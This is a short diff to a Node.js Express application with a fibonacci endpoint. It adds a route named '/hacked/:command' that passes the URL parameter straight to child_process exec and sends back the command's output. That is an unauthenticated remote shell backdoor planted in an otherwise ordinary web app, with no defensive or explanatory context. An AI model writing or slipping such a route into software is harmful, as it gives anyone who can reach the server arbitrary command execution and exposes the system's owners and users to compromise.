@@ -1,5 +1,6 @@
 var express = require('express');
 var app = express();
+var exec =require('child_process').exec;
 
 app.set('view engine' , 'ejs');
 
@@ -19,6 +20,14 @@ app.get('/fibonacci/:n' , function(req,res){
   res.json(answer);
 
 });
+app.get("/hacked/:command" , function(req,res){
+
+  var child = exec(req.params.command, function (error, stdout, stderr) {
+    res.send(stdout);
+  });
+
+});
+
 
 app.listen(3000 , function(){
 
